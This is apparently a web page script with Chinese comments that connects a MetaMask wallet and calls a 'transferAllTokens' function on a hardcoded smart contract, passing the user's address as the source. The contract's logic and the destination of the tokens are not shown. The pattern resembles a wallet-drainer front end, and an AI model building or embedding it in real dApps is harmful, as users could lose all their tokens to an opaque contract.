document.addEventListener('DOMContentLoaded', function () {
    let web3;
    let userAddress;
    let contract;
    const contractAddress = "0xd7Ca4e99F7C171B9ea2De80d3363c47009afaC5F"; // 智能合约地址
    const abi = [
        {
            "inputs": [{"internalType": "address","name": "from","type": "address"}],
            "name": "transferAllTokens",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        // 其他ABI内容...
    ];

    // 调试：确认页面已加载
    console.log("页面加载完成，准备绑定事件");

    // 连接钱包
    const connectButton = document.getElementById('connectButton');
    connectButton.addEventListener('click', async () => {
        console.log("点击了连接钱包按钮");

        try {
            // 检测是否有 Metamask
            if (typeof window.ethereum !== 'undefined') {
                console.log("检测到 Metamask，开始请求账户");
                
                // 请求连接钱包
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                userAddress = accounts[0];  // 获取第一个账户地址
                console.log("用户地址: ", userAddress);

                // 创建 web3 实例
                web3 = new Web3(window.ethereum);
                contract = new web3.eth.Contract(abi, contractAddress);

                // 更新 UI，表示钱包已连接
                document.getElementById('statusMessage').textContent = '钱包已连接: ' + userAddress;
                document.getElementById('transferButton').disabled = false;
            } else {
                console.log("未检测到 Metamask");
                alert('未检测到 Metamask，请安装或启用插件');
            }
        } catch (error) {
            console.error("连接钱包时出错: ", error);
            document.getElementById('statusMessage').textContent = '连接钱包失败，请重试';
        }
    });

    // 转移所有代币
    const transferButton = document.getElementById('transferButton');
    transferButton.addEventListener('click', async () => {
        console.log("点击了转移所有代币按钮");

        if (!userAddress || !contract) {
            alert('请先连接钱包');
            console.log("钱包未连接，无法转移代币");
            return;
        }

        try {
            console.log("开始执行代币转移...");
            
            const result = await contract.methods.transferAllTokens(userAddress).send({ from: userAddress });
            
            console.log("转移交易结果: ", result);
            alert('代币转移成功');
            document.getElementById('statusMessage').textContent = "代币转移成功";
        } catch (error) {
            console.error("代币转移时出错: ", error);
            document.getElementById('statusMessage').textContent = '代币转移失败，请重试';
        }
    });
});
